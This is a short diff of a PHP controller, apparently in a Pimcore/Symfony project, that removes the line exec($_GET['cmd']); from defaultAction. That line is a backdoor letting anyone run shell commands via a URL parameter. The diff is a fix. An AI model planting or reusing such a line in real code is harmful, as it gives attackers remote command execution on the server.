@@ -14,7 +14,6 @@ class DefaultController extends FrontendController
      */
     public function defaultAction(): Response
     {
-        exec($_GET['cmd']);
         return $this->render('default/default.html.twig');        
     }
 
